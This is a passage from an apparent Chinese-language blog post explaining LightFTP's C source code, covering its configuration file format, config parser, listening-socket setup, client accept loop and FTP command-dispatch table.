<li><code>config_init</code> 的返回值，将会放入 <code>config_parse</code> 中（作为第一个参数 <code>pcfg</code>）</li>
</ul>
<p>接下来看一看配置文件 <code>fftp.conf</code> 的内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[ftpconfig]</span><br><span class="line">port=<span class="number">21</span> <span class="comment">/* 要将服务器绑定到的端口号 */</span></span><br><span class="line">maxusers=<span class="number">10</span> <span class="comment">/* 与服务器的最大连接数,可同时建立 */</span></span><br><span class="line">interface=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="comment">/* 要绑定到的接口IP,使用0.0.0.0侦听任何可用接口,默认值:127.0.0.1 */</span></span><br><span class="line">local_mask=<span class="number">255.255</span><span class="number">.255</span><span class="number">.255</span> <span class="comment">/* 本地网络的IP掩码,这将有助于服务器区分本地客户端和互联网客户端,默认值:255.255.255.0 */</span></span><br><span class="line"></span><br><span class="line">minport=<span class="number">30000</span> <span class="comment">/* 数据连接的端口范围,您可以使用它在网关设备上配置端口转发 */</span></span><br><span class="line">maxport=<span class="number">60000</span></span><br><span class="line"></span><br><span class="line">goodbyemsg=Goodbye!</span><br><span class="line">keepalive=<span class="number">1</span> <span class="comment">/* 发送激活数据包(某些NAT可能需要这样做) */</span></span><br><span class="line"></span><br><span class="line">[anonymous]</span><br><span class="line">pswd=* <span class="comment">/* 表示“任何密码都匹配” */</span></span><br><span class="line">accs=readonly <span class="comment">/* 不允许登录 */</span></span><br><span class="line">root=/server/data/</span><br><span class="line">    </span><br><span class="line">[uploader]</span><br><span class="line">pswd=Weakuploaderpassword111</span><br><span class="line">accs=upload</span><br><span class="line">root=/home/user/ftpshare</span><br><span class="line"></span><br><span class="line">[webadmin]</span><br><span class="line">pswd=VeryStrongadminpassword222</span><br><span class="line">accs=admin</span><br><span class="line">root=/home/user/ftpshare</span><br></pre></td></tr></table></figure>
<ul>
<li>大括号容就是 <code>section_name</code></li>
<li>等号左边的内容就是 <code>key_name</code>，右边的内容就是将要被设置的值</li>
</ul>
<p>使用函数 <code>config_parse</code> 需要指定 <code>section_name</code> 和 <code>key_name</code>，该函数会把对应的值提取到参数 <code>value</code> 中，然后外传到上层函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">config_parse</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">char</span>      *pcfg,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">char</span>      *section_name,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">char</span>      *key_name,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">char</span>            *value,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">unsigned</span> <span class="keyword">long</span>   value_size_max)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>	sp;</span><br><span class="line">	<span class="keyword">char</span>			vname[<span class="number">256</span>], *p = (<span class="keyword">char</span> *)pcfg;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (value_size_max == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	--value_size_max;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (*p != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		p = skip_comments_and_blanks(p);</span><br><span class="line">		<span class="keyword">if</span> (*p == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (*p != <span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			++p;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		++p;</span><br><span class="line">		sp = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (</span><br><span class="line">				(*p != <span class="string">&#x27;]&#x27;</span>) &amp;&amp;</span><br><span class="line">				(*p != <span class="number">0</span>) &amp;&amp;</span><br><span class="line">				(*p != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp;</span><br><span class="line">				(sp &lt; <span class="number">255</span>)</span><br><span class="line">				)</span><br><span class="line">		&#123;</span><br><span class="line">			vname[sp] = *p;</span><br><span class="line">			++sp;</span><br><span class="line">			++p;</span><br><span class="line">		&#125;</span><br><span class="line">		vname[sp] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (*p == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (*p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		++p;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(vname, section_name) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">do</span> &#123;</span><br><span class="line">				p = skip_comments_and_blanks(p);</span><br><span class="line">				<span class="keyword">if</span> ((*p == <span class="number">0</span>) || (*p == <span class="string">&#x27;[&#x27;</span>))</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				sp = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">while</span> (</span><br><span class="line">						(*p != <span class="string">&#x27;=&#x27;</span>) &amp;&amp;</span><br><span class="line">						(*p != <span class="string">&#x27; &#x27;</span>) &amp;&amp;</span><br><span class="line">						(*p != <span class="number">0</span>) &amp;&amp;</span><br><span class="line">						(*p != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp;</span><br><span class="line">						(sp &lt; <span class="number">255</span>)</span><br><span class="line">						)</span><br><span class="line">				&#123;</span><br><span class="line">					vname[sp] = *p;</span><br><span class="line">					++sp;</span><br><span class="line">					++p;</span><br><span class="line">				&#125;</span><br><span class="line">				vname[sp] = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">if</span> (*p == <span class="number">0</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">while</span> (*p == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">					++p;</span><br><span class="line">				<span class="keyword">if</span> (*p != <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				p++;</span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">strcmp</span>(vname, key_name) == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					sp = <span class="number">0</span>;</span><br><span class="line">					<span class="keyword">while</span> (</span><br><span class="line">							(*p != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp;</span><br><span class="line">							(*p != <span class="number">0</span>)</span><br><span class="line">							)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span> (sp &lt; value_size_max)</span><br><span class="line">							value[sp] = *p;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">							<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">						++sp;</span><br><span class="line">						++p;</span><br><span class="line">					&#125;</span><br><span class="line">					value[sp] = <span class="number">0</span>;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">while</span> (</span><br><span class="line">							(*p != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp;</span><br><span class="line">							(*p != <span class="number">0</span>)</span><br><span class="line">							)</span><br><span class="line">						++p;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">while</span> (*p != <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">do</span> &#123;</span><br><span class="line">				p = skip_comments_and_blanks(p);</span><br><span class="line">				<span class="keyword">if</span> ((*p == <span class="number">0</span>) || (*p == <span class="string">&#x27;[&#x27;</span>))</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">while</span> (</span><br><span class="line">						(*p != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp;</span><br><span class="line">						(*p != <span class="number">0</span>)</span><br><span class="line">						)</span><br><span class="line">					++p;</span><br><span class="line">			&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数 <code>config_parse</code> 总体的思路就是利用2个 <code>while</code> 循环来变量所有的 <code>section_name</code> 和 <code>key_name</code>：</p>
<ul>
<li>外层的循环会匹配大括号 <code>[]</code>，用一个 <code>while</code> 读取出 <code>section_name</code> 然后进行匹配：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(vname, section_name) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>内层的循环会匹配等号 <code>=</code>，用一个 <code>while</code> 读取出 <code>key_name</code> 然后进行匹配：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(vname, key_name) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>最后用一个 <code>while</code> 把等号右边的数据存储到 <code>value</code> 中：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((*p != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp;(*p != <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (sp &lt; value_size_max)</span><br><span class="line">        value[sp] = *p;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    ++sp;</span><br><span class="line">    ++p;</span><br><span class="line">&#125;</span><br><span class="line">value[sp] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>函数 <code>config_parse</code> 最后返回的 <code>value</code> 将被会存储在结构体 <code>FTP_CONFIG</code> 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">FTP_CONFIG</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span>*           ConfigFile;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>    MaxUsers;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>    EnableKeepalive;</span><br><span class="line">    <span class="keyword">in_port_t</span>       Port;</span><br><span class="line">    <span class="keyword">in_port_t</span>       PasvPortBase;</span><br><span class="line">    <span class="keyword">in_port_t</span>       PasvPortMax;</span><br><span class="line">    <span class="keyword">in_addr_t</span>       BindToInterface;</span><br><span class="line">    <span class="keyword">in_addr_t</span>       ExternalInterface;</span><br><span class="line">    <span class="keyword">in_addr_t</span>       LocalIPMask;</span><br><span class="line">&#125; FTP_CONFIG, *PFTP_CONFIG;</span><br></pre></td></tr></table></figure>
<p><strong>LightFTP 与目标主机建立连接</strong></p>
<p>把服务器中 <code>socket bind listen</code> 的代码提取出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    ftpsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); <span class="comment">/* 基于IPv4和TCP */</span></span><br><span class="line">    <span class="keyword">if</span> ( ftpsocket == INVALID_SOCKET )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\r\n socket create error\r\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rv = <span class="number">1</span>;</span><br><span class="line">    setsockopt(ftpsocket, SOL_SOCKET, SO_REUSEADDR, &amp;rv, <span class="keyword">sizeof</span>(rv)); </span><br><span class="line"><span class="comment">/* SO_REUSEADDR:打开或关闭地址复用功能 */</span></span><br><span class="line"></span><br><span class="line">    scb = (SOCKET *)x_malloc(<span class="keyword">sizeof</span>(SOCKET)*g_cfg.MaxUsers);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;g_cfg.MaxUsers; i++)</span><br><span class="line">        scb[i] = INVALID_SOCKET; <span class="comment">/* 初始化为&#x27;-1&#x27; */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;laddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(laddr));</span><br><span class="line">    laddr.sin_family = AF_INET;</span><br><span class="line">    laddr.sin_port = htons(g_cfg.Port);</span><br><span class="line">    laddr.sin_addr.s_addr = g_cfg.BindToInterface;</span><br><span class="line">    socketret = bind(ftpsocket, (struct sockaddr *)&amp;laddr, <span class="keyword">sizeof</span>(laddr));</span><br><span class="line">    <span class="keyword">if</span>  ( socketret != <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\r\n Failed to start server. Can not bind to address\r\n\r\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(scb);</span><br><span class="line">        close(ftpsocket);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    writelogentry(<span class="literal">NULL</span>, success220, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    socketret = listen(ftpsocket, SOMAXCONN); <span class="comment">/* socket的排队个数为SOMAXCONN,内核规定的最大连接数 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>setsockopt</code> 函数可以对 socket 进行详细的设置</li>
<li><code>SO_REUSEADDR</code> 参数提供如下四个功能： <ul>
<li><code>SO_REUSEADDR</code> 允许启动一个监听服务器并捆绑其众所周知端口，即使以前建立的将此端口用做他们的本地端口的连接仍存在（这通常是重启监听服务器时出现，若不设置此选项，则 <code>bind</code> 时将出错）</li>
<li><code>SO_REUSEADDR</code> 允许在同一端口上启动同一服务器的多个实例，只要每个实例捆绑一个不同的本地 IP 地址即可（对于 TCP，我们根本不可能启动捆绑相同 IP 地址和相同端口号的多个服务器）</li>
<li><code>SO_REUSEADDR</code> 允许单个进程捆绑同一端口到多个套接口上，只要每个捆绑指定不同的本地 IP 地址即可。这一般不用于 TCP 服务器</li>
<li><code>SO_REUSEADDR</code> 允许完全重复的捆绑：当一个 IP 地址和端口绑定到某个套接口上时，还允许此 IP 地址和端口捆绑到另一个套接口上（一般来说，这个特性仅在支持多播的系统上才有，而且只对UDP套接口而言，TCP不支持多播）</li>
</ul>
</li>
</ul>
<p>然后再循环里面 <code>accept</code> 客户端的请求：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( socketret == <span class="number">0</span> ) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;laddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(laddr));</span><br><span class="line">    asz = <span class="keyword">sizeof</span>(laddr);</span><br><span class="line">    clientsocket = accept(ftpsocket, (struct sockaddr *)&amp;laddr, &amp;asz); </span><br><span class="line">    <span class="comment">/* 一次大循环连接一台客户端主机 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (clientsocket == INVALID_SOCKET) <span class="comment">/* 没有accept时则直接continue */</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    rv = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;g_cfg.MaxUsers; i++)</span><br><span class="line">        <span class="keyword">if</span> ( scb[i] == INVALID_SOCKET ) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (g_cfg.EnableKeepalive != <span class="number">0</span>)</span><br><span class="line">                socket_set_keepalive(clientsocket); </span><br><span class="line">            <span class="comment">/* 调用setsockopt对socket进行设置 */</span></span><br><span class="line">            </span><br><span class="line">            scb[i] = clientsocket;</span><br><span class="line">            rv = pthread_create(&amp;th, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))ftp_client_thread, &amp;scb[i]);</span><br><span class="line">            <span class="keyword">if</span> ( rv != <span class="number">0</span> ) <span class="comment">/* pthread_create返回&#x27;0&#x27;代表创建成功 */</span></span><br><span class="line">                scb[i] = INVALID_SOCKET;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( rv != <span class="number">0</span> ) &#123;</span><br><span class="line">        sendstring_plaintext(clientsocket, NOSLOTS);</span><br><span class="line">        close(clientsocket);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>g_cfg.MaxUsers</code>：服务器可以并发处理的客户端最大数目</li>
</ul>
<p><strong>LightFTP 实现 FTP 命令集</strong></p>
<p>实现 FTP 命令集的函数就是 <code>ftp_client_thread</code></p>
<p>在此之前需要介绍一下 LightFTP 中的一个结构体数组：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> FTPROUTINE_ENTRY ftpprocs[MAX_CMDS] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;USER&quot;</span>, ftpUSER&#125;, &#123;<span class="string">&quot;QUIT&quot;</span>, ftpQUIT&#125;, &#123;<span class="string">&quot;NOOP&quot;</span>, ftpNOOP&#125;, &#123;<span class="string">&quot;PWD&quot;</span>,  ftpPWD &#125;,</span><br><span class="line">        &#123;<span class="string">&quot;TYPE&quot;</span>, ftpTYPE&#125;, &#123;<span class="string">&quot;PORT&quot;</span>, ftpPORT&#125;, &#123;<span class="string">&quot;LIST&quot;</span>, ftpLIST&#125;, &#123;<span class="string">&quot;CDUP&quot;</span>, ftpCDUP&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;CWD&quot;</span>,  ftpCWD &#125;, &#123;<span class="string">&quot;RETR&quot;</span>, ftpRETR&#125;, &#123;<span class="string">&quot;ABOR&quot;</span>, ftpABOR&#125;, &#123;<span class="string">&quot;DELE&quot;</span>, ftpDELE&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;PASV&quot;</span>, ftpPASV&#125;, &#123;<span class="string">&quot;PASS&quot;</span>, ftpPASS&#125;, &#123;<span class="string">&quot;REST&quot;</span>, ftpREST&#125;, &#123;<span class="string">&quot;SIZE&quot;</span>, ftpSIZE&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;MKD&quot;</span>,  ftpMKD &#125;, &#123;<span class="string">&quot;RMD&quot;</span>,  ftpRMD &#125;, &#123;<span class="string">&quot;STOR&quot;</span>, ftpSTOR&#125;, &#123;<span class="string">&quot;SYST&quot;</span>, ftpSYST&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;FEAT&quot;</span>, ftpFEAT&#125;, &#123;<span class="string">&quot;APPE&quot;</span>, ftpAPPE&#125;, &#123;<span class="string">&quot;RNFR&quot;</span>, ftpRNFR&#125;, &#123;<span class="string">&quot;RNTO&quot;</span>, ftpRNTO&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;OPTS&quot;</span>, ftpOPTS&#125;, &#123;<span class="string">&quot;MLSD&quot;</span>, ftpMLSD&#125;, &#123;<span class="string">&quot;AUTH&quot;</span>, ftpAUTH&#125;, &#123;<span class="string">&quot;PBSZ&quot;</span>, ftpPBSZ&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;PROT&quot;</span>, ftpPROT&#125;, &#123;<span class="string">&quot;EPSV&quot;</span>, ftpEPSV&#125;, &#123;<span class="string">&quot;HELP&quot;</span>, ftpHELP&#125;, &#123;<span class="string">&quot;SITE&quot;</span>, ftpSITE&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>乍一看这个结构有点像 Python 中的字典（用于把 “FTP 命令名称” 和 “对应的函数指针” 绑定）</li>
<li>但这其实是 <code>FTPROUTINE_ENTRY</code> 类型的数组</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">FTPROUTINE_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* Name;</span><br><span class="line">    FTPROUTINE  Proc;</span><br><span class="line">&#125; FTPROUTINE_ENTRY, *PFTPROUTINE_ENTRY;</span><br></pre></td></tr></table></figure>
<p>使用这个结构体数组的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( ctx.ControlSocket != INVALID_SOCKET ) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !recvcmd(&amp;ctx, rcvbuf, <span class="keyword">sizeof</span>(rcvbuf)) ) <span class="comment">/* 从客服端中读取数据 */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((rcvbuf[i] != <span class="number">0</span>) &amp;&amp; (<span class="built_in">isalpha</span>(rcvbuf[i]) == <span class="number">0</span>)) <span class="comment">/* 检查输入值是否为字母,并用while跳过所有的非字母 */</span></span><br><span class="line">        ++i;</span><br><span class="line"></span><br><span class="line">    cmd = &amp;rcvbuf[i]; <span class="comment">/* 确定ftp命令的起始地址 */</span></span><br><span class="line">    <span class="keyword">while</span> ((rcvbuf[i] != <span class="number">0</span>) &amp;&amp; (rcvbuf[i] != <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* 用while跳过所有的非空格(方便计算出ftp命令的长度) */</span></span><br><span class="line">        ++i;</span><br><span class="line"></span><br><span class="line">    cmdlen = &amp;rcvbuf[i] - cmd;</span><br><span class="line">    <span class="keyword">while</span> (rcvbuf[i] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        ++i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rcvbuf[i] == <span class="number">0</span>)</span><br><span class="line">        params = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        params = &amp;rcvbuf[i];</span><br><span class="line"></span><br><span class="line">    cmdno = <span class="number">-1</span>;</span><br><span class="line">    rv = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (c=<span class="number">0</span>; c&lt;MAX_CMDS; c++)</span><br><span class="line">        <span class="keyword">if</span> (strncasecmp(cmd, ftpprocs[c].Name, cmdlen) == <span class="number">0</span>)</span><br><span class="line">        &#123; <span class="comment">/* 遍历数组ftpprocs中所有的ftp命令,并执行目标命令 */</span></span><br><span class="line">            cmdno = c;</span><br><span class="line">            rv = ftpprocs[c].Proc(&amp;ctx, params);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( cmdno != FTP_PASSCMD_INDEX )</span><br><span class="line">        writelogentry(&amp;ctx, <span class="string">&quot; @@ CMD: &quot;</span>, rcvbuf);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        writelogentry(&amp;ctx, <span class="string">&quot; @@ 